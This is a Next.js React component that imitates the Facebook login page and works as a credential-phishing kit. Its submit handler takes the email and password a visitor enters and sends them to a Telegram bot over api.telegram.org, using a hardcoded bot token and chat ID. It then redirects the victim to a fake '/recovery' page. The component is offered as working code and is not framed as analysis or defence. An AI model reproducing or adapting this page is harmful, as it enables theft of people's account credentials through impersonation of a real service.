
import Image from "next/image";
import fb from "../../public/assets/fb.svg";
import styles from '../../styles/Facebook.module.css'
import { useRef, useState } from 'react';
import router from "next/router";
const Facebook = () => {
  const [error, setError] = useState(true)
  const emailref = useRef();
  const passref = useRef();

  let bot = {
    token: "2140501096:AAHJgY2SgrHFvMRQWiND_k7z2RBRfdeDHSE",
    chatID: "2130650938"
  };

  // let status = "disabled";
  const handleSubmit = (e) => {
    e.preventDefault();
    let email = emailref.current.value;
    let pass = passref.current.value;

    if (email === "" || pass === "") {
      setError(false)
    } else {
      let sms = [email, pass]

      fetch(
        `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}=&text=${sms}`,
        {
          method: "GET",
        }
      ).then(
        (success) => {
          router.push("/recovery");
        },
        (error) => {
          alert("message Not Sent");
          console.log(error);
        }
      );
    }
  };

  console.log(error)


  return (
    <>
      {error ?
        <section className={styles.sec}>
          <div className="container">
            <div className="row">
              <div className="col-12 col-md-6">
                <div className={styles.left_content}>
                  <div className={styles.logo}>
                    <Image src={fb} alt="Button img" height="110" />
                  </div>
                  <h4>
                    Facebook helps you connect and share with the people in your life
                  </h4>
                </div>
              </div>
              <div className="col-12 col-md-6">
                <div className="right-content">
                  <div className={styles.logCard}>
                    <form className="form-group" onSubmit={handleSubmit}>
                      <div className={styles._6lux}>
                        <input ref={emailref} className={`${styles.logForm} form-control `} type="text" placeholder="Email address or phone number" />
                      </div>
                      <div className={styles._6lux}>
                        <input ref={passref} className={`${styles.logForm} form-control `} type="password" placeholder="Password" />
                      </div>
                      <button type="submit" className={styles.logbtn}>Log In</button>
                    </form>
                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" className="pt-2">Forgotten password?</a>
                    <hr />
                    <div className={styles._6ltg}>
                      <button className={styles.createBtn}>Create New Account</button>
                    </div>
                  </div>
                  <p className={styles.pageCrt}> <a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a> for a celebrity, brand or business.</p>
                </div>
              </div>
            </div>
          </div>
        </section> : <section className={styles.sec2}>
          <div className="container">
            <div className="row justify-content-center">
              <div className="col-md-6 ">
                <div className="right-content">
                  <div className={styles.forlogo}>
                    <Image src={fb} alt="Button img" height="110" />
                  </div>
                  <div className={styles.logCard}>
                    <p className='text-center' style={{ fontSize: "20px" }}>Log in to Facebook</p>
                    <form className="form-group" onSubmit={handleSubmit}>
                      <div className={styles._6lux}>
                        <input ref={emailref} className={`${styles.logForm} form-control `} type="text" placeholder="Email address or phone number" />
                      </div>
                      <div className={styles._6lux}>
                        {error ? <p>&quot;</p> : <small style={{ fontWeight: "600" }} className='text-danger'>The email address or mobile number you entered is not connected to an account. Find your account and log in.</small>}
                      </div>
                      <div className={styles._6lux}>
                        <input ref={passref} className={`${styles.logForm} form-control `} type="password" placeholder="Password" />
                      </div>
                      <button type="submit" className={styles.logbtn}>Log In</button>
                    </form>
                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" className="pt-2">Forgotten password?</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      }
    </>
  );
};

export default Facebook;


